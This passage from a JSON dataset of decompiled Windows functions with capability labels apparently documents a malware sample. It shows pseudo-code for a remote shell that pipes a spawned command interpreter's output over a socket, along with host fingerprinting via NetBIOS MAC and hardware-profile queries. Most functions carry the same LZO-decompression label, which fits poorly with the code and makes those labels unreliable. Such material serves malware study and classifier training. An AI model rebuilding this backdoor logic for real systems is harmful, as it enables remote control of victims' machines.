        "decompiled_code": "\nvoid fcn.0048a348(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack24 = 0x48a35b;\n    fcn.004058ec();\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (0 < iVar2) {\n        do {\n    // switch table (55 cases) at 0x48a3e3\n            switch(*(in_EAX + -1 + iVar2)) {\n            case 0x30:\n                break;\n            case 0x31:\n                break;\n            case 0x32:\n                break;\n            case 0x33:\n                break;\n            case 0x34:\n                break;\n            case 0x35:\n                break;\n            case 0x36:\n                break;\n            case 0x37:\n                break;\n            case 0x38:\n                break;\n            case 0x39:\n                break;\n            case 0x41:\n                break;\n            case 0x42:\n                break;\n            case 0x43:\n                break;\n            case 0x44:\n                break;\n            case 0x45:\n                break;\n            case 0x46:\n                break;\n            case 0x61:\n                break;\n            case 0x62:\n                break;\n            case 99:\n                break;\n            case 100:\n                break;\n            case 0x65:\n                break;\n            case 0x66:\n            }\n            iVar1 = in_EAX;\n            if (in_EAX != 0) {\n                iVar1 = *(in_EAX + -4);\n            }\n            if (iVar1 != iVar2) {\n                iVar1 = in_EAX;\n                if (in_EAX != 0) {\n                    iVar1 = *(in_EAX + -4);\n                }\n                if (0 < iVar1) {\n                    do {\n                        iVar1 = iVar1 + -1;\n                    } while (iVar1 != 0);\n                }\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    uStack24 = 0x48a53f;\n    uStack28 = 0x48a537;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 592
    },
    "0048ad08": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.0048ad08(void)\n\n{\n    uint *in_EAX;\n    uint arg_8h;\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_130h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_114h;\n    uint uStackY156;\n    uint uStackY152;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    iVar1 = 0x2b;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    puVar3 = &fcn.0048ad08::var_138h;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    for (iVar1 = 0x4a; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *in_EAX;\n        in_EAX = in_EAX + 1;\n        puVar3 = puVar3 + 1;\n    }\n    uStack32 = 0x48aeed;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.0040546c();\n    for (uVar2 = 0; *(&fcn.0048ad08::var_114h + (uVar2 & 0xff)) != '\\0'; uVar2 = uVar2 + 1) {\n        fcn.00405654();\n        fcn.00405738();\n    }\n    fcn.0048a8ac();\n    fcn.0048a93c();\n    if (var_8h != 0) {\n        var_8h = *(var_8h + -4);\n    }\n    if (var_8h == 0) {\n        fcn.00405504();\n    }\n    if (var_ch != 0) {\n        var_ch = *(var_ch + -4);\n    }\n    if (var_ch == 0) {\n        fcn.00405504();\n    }\n    fcn.0048ac50();\n    fcn.00409d58(var_124h);\n    fcn.00409d58(var_130h);\n    fcn.00409d58(var_10h);\n    fcn.00409d58(var_120h);\n    fcn.0048aaec();\n    arg_8h = sub.kernel32.dll_GetCurrentProcessId();\n    uStackY152 = 0x48aeb0;\n    fcn.00409d58(arg_8h);\n    uStackY152 = var_158h;\n    uStackY156 = 0x48aec2;\n    fcn.00405800();\n    *in_FS_OFFSET = uStackY152;\n    fcn.00405490();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 809
    },
    "0048c238": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048c238(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    for (; (0 < iVar1 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + -1) {\n    }\n    fcn.00405964(param_2);\n    return;\n}\n",
        "token_count": 124
    },
    "0048c718": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048c86c)\n\nvoid fcn.0048c718(void)\n\n{\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack200;\n    uint uStack184;\n    uint uStack180;\n    uchar *puStack176;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    \n    puStack176 = &stack0xfffffffc;\n    uStack180 = 0x48c8ef;\n    uStack184 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack184;\n    fcn.004054c0();\n    lpVersionInformation = 0x94;\n    sub.kernel32.dll_GetVersionExA(&lpVersionInformation);\n    if (var_84h == 1) {\n        if (var_8ch == 0) {\n            fcn.004054c0();\n        }\n        else if (var_8ch == 10) {\n            fcn.004054c0();\n        }\n        else if (var_8ch == 0x5a) {\n            fcn.004054c0();\n        }\n    }\n    else if (var_84h == 2) {\n        if (var_90h == 4) {\n            fcn.004054c0();\n        }\n        else if (var_90h == 5) {\n            if (var_8ch == 0) {\n                fcn.004054c0();\n            }\n            else if (var_8ch == 1) {\n                fcn.004054c0();\n            }\n            else if (var_8ch == 2) {\n                fcn.004054c0();\n            }\n        }\n        else if (var_90h == 6) {\n            if (var_8ch == 0) {\n                fcn.004054c0();\n            }\n            else if (var_8ch == 1) {\n                fcn.004054c0();\n            }\n        }\n    }\n    fcn.004056dc();\n    if (var_88h != 0) {\n        uVar3 = *in_EAX;\n        uVar2 = 0x48c9e8;\n        uVar1 = 0;\n        fcn.00409d58(var_88h);\n        fcn.00405800(0x48c9f4, 0, var_88h, uVar1, uVar2, uVar3);\n    }\n    *in_FS_OFFSET = uStack200;\n    fcn.00405490(0x48c8f6);\n    return;\n}\n",
        "token_count": 642
    },
    "0048ca88": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048ca88(uint param_1, uint8_t **param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    \n    puVar2 = in_EAX;\n    if (in_EAX != NULL) {\n        puVar2 = *(in_EAX + -4);\n    }\n    fcn.00405b8c();\n    puVar3 = *param_2;\n    for (; puVar2 != NULL; puVar2 = puVar2 + -1) {\n        uVar1 = *in_EAX;\n        if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n            uVar1 = uVar1 + 0x20;\n        }\n        *puVar3 = uVar1;\n        in_EAX = in_EAX + 1;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "0048cddc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048cddc(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *in_stack_fffffcf8;\n    int32_t iStack764;\n    uint uStack760;\n    uchar *puStack756;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b2h;\n    uint var_48h;\n    int32_t var_44h;\n    ushort var_40h;\n    uint var_3eh;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack756 = 0x48cdf9;\n    fcn.004058ec();\n    uStack760 = 0x48cf6a;\n    iStack764 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd04;\n    puStack756 = &stack0xfffffffc;\n    fcn.00403ae4();\n    var_48h._0_1_ = 0x32;\n    sub.netapi32.dll_Netbios(&fcn.0048cddc::var_48h);\n    fcn.00403ae4();\n    fcn.00403ae4();\n    fcn.0040595c();\n    fcn.004030ec();\n    var_48h._0_1_ = 0x33;\n    var_18h._0_1_ = 0;\n    var_40h = 0x26a;\n    iVar1 = fcn.00402ef0();\n    if (iVar1 == 0) {\n        fcn.004054c0();\n    }\n    else {\n        var_44h = iVar1;\n        sub.netapi32.dll_Netbios(&fcn.0048cddc::var_48h);\n        fcn.004030ec();\n        in_stack_fffffcf8 = &fcn.0048cddc::var_8h;\n        fcn.0040ae94(in_stack_fffffcf8);\n        fcn.00402f0c();\n        fcn.004054c0();\n    }\n    *in_FS_OFFSET = in_stack_fffffcf8;\n    fcn.00405490(0x48cf71);\n    return;\n}\n",
        "token_count": 606
    },
    "0048d214": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048d214(uint param_1, uint param_2)\n\n{\n    fcn.0040a448();\n    fcn.00405964(param_2);\n    return;\n}\n",
        "token_count": 46
    },
    "0048d2c8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048d2c8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x48d377;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405b8c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004058fc();\n    sub.kernel32.dll_GetTempPathA(iVar2, uVar1);\n    fcn.00405b8c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar3) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405490(0x48d37e);\n    return;\n}\n",
        "token_count": 327
    },
    "0048d390": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048d390(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x48d43f;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405b8c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004058fc(iVar2);\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1);\n    fcn.00405b8c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar3) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405490(0x48d446);\n    return;\n}\n",
        "token_count": 324
    },
    "0048d458": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048d458(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x48d507;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405b8c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004058fc(iVar2);\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1);\n    fcn.00405b8c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar3) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405490(0x48d50e);\n    return;\n}\n",
        "token_count": 324
    },
    "0048d5b4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0048d62a)\n// WARNING: Removing unreachable block (ram,0x0048d63c)\n\nvoid fcn.0048d5b4(void)\n\n{\n    char in_AL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x48d6c5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48d6a0;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    if (in_AL != '\\0') {\n        fcn.00409a78();\n    }\n    fcn.004214dc();\n    fcn.004054c0();\n    fcn.0042147c();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x48d6a7;\n    uStack44 = 0x48d692;\n    fcn.00404640();\n    uStack44 = 2;\n    uStack48 = 0;\n    sub.user32.dll_SystemParametersInfoA(0x14, 0);\n    return;\n}\n",
        "token_count": 375
    },
    "0048e3cc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048e3cc(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uchar uVar1;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint pszPath;\n    uint pidl;\n    int32_t var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_114h = 0;\n    var_4h = 0;\n    uStack296 = 0x48e48c;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack300;\n    sub.shell32.dll_SHGetSpecialFolderLocation(0);\n    sub.shell32.dll_SHGetPathFromIDListA(pidl, &pszPath);\n    fcn.0040a9a4();\n    uVar1 = var_4h == 0 || var_4h == 4;\n    fcn.00405964();\n    fcn.00405894();\n    if (uVar1) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = &var_114h;\n    fcn.0040546c(0x48e493);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 291
    },
    "0048ed24": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0048ed24(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t iStack192;\n    uint uStack188;\n    uchar *puStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uchar *puStack172;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint lpHwProfileInfo;\n    uint var_83h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack172 = &stack0xfffffffc;\n    puStack184 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack176 = 0x48eeba;\n    iStack180 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack180;\n    uStack188 = 0x48ee78;\n    iStack192 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack192;\n    iVar1 = sub.advapi32.dll_GetCurrentHwProfileA(&lpHwProfileInfo);\n    if (iVar1 == 0) {\n        fcn.0048d2c8();\n        fcn.0040a4d0();\n        fcn.00405738();\n        fcn.0048ff1c();\n        iVar2 = 0x48eee8;\n        iVar1 = var_8h;\n        fcn.00405800(0x48eee8, var_8h, 0x48eedc);\n        *in_FS_OFFSET = iVar2;\n    }\n    else {\n        fcn.004056dc();\n        fcn.00405964(&var_4h);\n        fcn.0048d2c8();\n        fcn.0040a4d0();\n        fcn.00405738();\n        fcn.0048ff1c();\n        iVar2 = 0x48eee8;\n        iVar1 = var_4h;\n        fcn.00405800(0x48eee8, var_8h, 0x48eef4);\n        *in_FS_OFFSET = iVar2;\n    }\n    *in_FS_OFFSET = iVar1;\n    fcn.00405490(0x48eec1);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 536
    },
    "00492b78": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00492b78 noreturn (void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack1472;\n    uint uStack1468;\n    uchar *puStack1464;\n    uint var_5a4h;\n    uint var_5a0h;\n    uint var_59ah;\n    int32_t var_596h;\n    uint var_592h;\n    uint var_58eh;\n    uint var_57eh;\n    uint var_17dh;\n    uint var_78h;\n    uint var_74h;\n    uint var_68h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack1464 = &stack0xfffffffc;\n    var_5a0h = 0;\n    var_4h = 0;\n    uStack1468 = 0x492e4e;\n    uStack1472 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack1472;\n    puVar1 = fcn.00402ef0();\n    *puVar1 = 0xc;\n    puVar1[2] = 0xffffffff;\n    puVar1[1] = 0;\n    sub.kernel32.dll_CreatePipe(&var_8h, &var_ch, puVar1, 0);\n    sub.kernel32.dll_CreatePipe(&var_10h, &var_14h, puVar1, 0);\n    sub.kernel32.dll_GetEnvironmentVariableA(0x492e60, &var_17dh, 0x105);\n    fcn.00403ae4();\n    var_68h = 0x44;\n    var_3ch = 0x101;\n    var_38h._0_2_ = 0;\n    var_30h = var_10h;\n    var_2ch = var_ch;\n    var_28h = var_ch;\n    uVar4 = 0;\n    iVar2 = sub.kernel32.dll_CreateProcessA(0, &var_17dh, puVar1, puVar1, 0xffffffff, 0, 0, 0, &var_68h, &var_78h);\n    if (iVar2 != 0) {\n        while (uVar4 = var_78h,  sub.kernel32.dll_GetExitCodeProcess(),  var_1ch == 0x103) {\n            fcn.0040546c();\n            uVar4 = var_8h;\n            sub.kernel32.dll_PeekNamedPipe(var_8h, 0, 0, 0, &var_18h, 0);\n            uVar3 = var_8h;\n            while ((var_8h = uVar3,  var_18h != 0 &&\n                   (iVar2 = sub.kernel32.dll_ReadFile_1(),  uVar4 = uVar3,  iVar2 != 0))) {\n                fcn.004056dc(&var_5a0h);\n                fcn.00405964();\n                fcn.00405738();\n                uVar4 = var_8h;\n                sub.kernel32.dll_PeekNamedPipe();\n                uVar3 = var_8h;\n            }\n            iVar2 = var_4h;\n            if (var_4h != 0) {\n                iVar2 = *(var_4h + -4);\n            }\n            if (0 < iVar2) {\n                var_20h = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14, uVar4);\n                fcn.004054c0();\n                fcn.004054c0();\n                fcn.004054c0();\n                fcn.004054c0();\n                fcn.004054c0();\n                uVar4 = sub.kernel32.dll_CreateThread(0, 0, fcn.00490f58, var_20h, 0, &var_24h);\n                sub.kernel32.dll_CloseHandle_1(uVar4);\n            }\n            sub.user32.dll_GetMessageA();\n            if (var_596h == 6) {\n                sub.kernel32.dll_WriteFile_1(var_14h, var_58eh, var_592h, &var_18h, 0);\n                sub.kernel32.dll_WriteFile_1();\n            }\n        }\n    }\n    fcn.004938a4(uVar4);\n    *0x4ad498 = 0;\n    sub.kernel32.dll_TerminateProcess(var_78h, 0);\n    sub.kernel32.dll_CloseHandle_1(var_78h);\n    sub.kernel32.dll_CloseHandle_1(var_74h);\n    fcn.00402f0c();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 1158
    },
    "00492ef4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00492f32)\n\nvoid fcn.00492ef4 noreturn (void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x492f74;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar1 = sub.kernel32.dll_GetTickCount_1();\n    uVar2 = 0;\n    fcn.00409d58(uVar1);\n    fcn.00405784(uVar1, uVar2);\n    uVar1 = fcn.0040595c(0, 0);\n    sub.wsock32.dll_send(**0x4a4f1c, uVar1);\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 239
    },
    "004938a4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004938a4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4938bc;\n    fcn.004058ec();\n    uStack28 = 0x49392a;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.0044c34c();\n    fcn.00405504();\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    uVar1 = fcn.0040595c(in_EAX, 0);\n    uVar2 = **0x4a4f1c;\n    sub.wsock32.dll_send(uVar2, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x493931);\n    return;\n}\n",
        "token_count": 259
    },
    "0049393c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0049393c(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x493956;\n    fcn.004058ec();\n    uStack28 = 0x4939bd;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.0044c34c();\n    fcn.00405504();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    fcn.0040595c(param_2, 0);\n    sub.wsock32.dll_send();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00405490(0x4939c4);\n    return;\n}\n",
        "token_count": 232
    },
    "004939cc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004939cc(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x4939df;\n    fcn.004058ec();\n    uStack24 = 0x493a23;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    puStack20 = &stack0xfffffffc;\n    fcn.0040595c(param_2, 0);\n    sub.wsock32.dll_send();\n    *in_FS_OFFSET = in_EAX;\n    fcn.0040546c(0x493a2a);\n    return;\n}\n",
        "token_count": 208
    },
    "0049d6d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0049d6d4(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY76;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0x5;\n    do {\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_18h = 0x49d6f4;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.004058ec();\n    var_1ch = 0x49d828;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0049d6d4::var_20h;\n    var_ch = *0x4ad4a0;\n    puVar1 = *0x4ad4a0;\n    if (*0x4ad4a0 != NULL) {\n        puVar1 = *(*0x4ad4a0 + -4);\n    }\n    var_18h = &stack0xfffffffc;\n    if (puVar1 == NULL) {\n        var_18h = &stack0xfffffffc;\n        fcn.0049d624();\n    }\n    fcn.00405800(0x49d850, var_4h, 0x49d840);\n    fcn.004096d8();\n    iVar2 = fcn.00405a48();\n    if (0 < iVar2) {\n        fcn.00405800(0x49d850, var_4h, 0x49d840);\n        fcn.004096d8();\n        var_ch = var_18h;\n        fcn.00405800(0x49d850, var_4h, 0x49d840);\n        fcn.004096d8();\n        fcn.00405a48();\n        fcn.00405784();\n        fcn.004096d8();\n        fcn.00405a48();\n        uStackY76 = var_8h;\n        fcn.00405964();\n    }\n    *in_FS_OFFSET = uStackY76;\n    fcn.00405490(0x49d82f);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 670
    },
    "0049dd50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0049dd50(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack20 = 0x49ddc6;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack24;\n    fcn.0040a588();\n    fcn.00405964(&var_4h);\n    do {\n        sub.kernel32.dll_Sleep_1();\n        fcn.0049db20();\n    } while( true );\n}\n",
        "token_count": 151
    },
    "004015dc": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.004015dc(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t **in_EAX;\n    uint32_t uVar5;\n    \n    piVar2 = in_EAX[1];\n    piVar3 = *in_EAX;\n    *piVar2 = piVar3;\n    piVar3[1] = piVar2;\n    if (piVar2 == piVar3) {\n        uVar5 = piVar2 + -0x1299ea >> 8 & 0xff;\n        uVar4 = piVar2 + -0x1299ea >> 3 & 0x1f;\n        puVar1 = uVar5 * 4 + 0x4a6728;\n        *puVar1 = *puVar1 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n        if (*puVar1 == 0) {\n            uVar4 = uVar5 & 0x1f;\n            *0x4a6724 = *0x4a6724 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 296
    },
    "0040161c": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
